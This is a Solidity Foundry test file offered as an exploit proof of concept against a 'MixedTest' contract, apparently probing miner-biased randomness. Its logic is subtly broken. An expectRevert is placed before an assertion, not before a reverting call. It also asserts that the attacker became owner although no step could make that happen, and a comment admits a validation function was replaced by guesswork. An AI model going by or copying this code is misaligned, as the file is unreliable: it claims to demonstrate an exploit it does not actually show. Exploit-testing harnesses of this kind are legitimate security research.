// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/5684f35b-181f-4225-ac36-a9189f9c2961_Mixed.sol";

contract MixedTestPoC is BaseTestWithBalanceLog {
    MixedTest target;

    function setUp() public {
        target = new MixedTest();
    }

    function testExploit() public balanceLog {
        address attacker = vm.addr(1);
        vm.startPrank(attacker);

        uint256 initialValue = 1 ether;
        target.deposit{value: initialValue}();

        // Call the random() function multiple times
        for (uint256 i = 0; i < 10; ++i) {
            uint256 randomNumber = target.random();
            vm.expectRevert(bytes("Randomness is biased by miners"));
            assertNotEq(randomNumber % 3, 0); // Example assertion to check bias
        }

        vm.stopPrank();

        // Validate the exploit
        assertTrue(target.owner() == attacker); // Assuming validateExploit() is replaced with a simple assertion
    }
}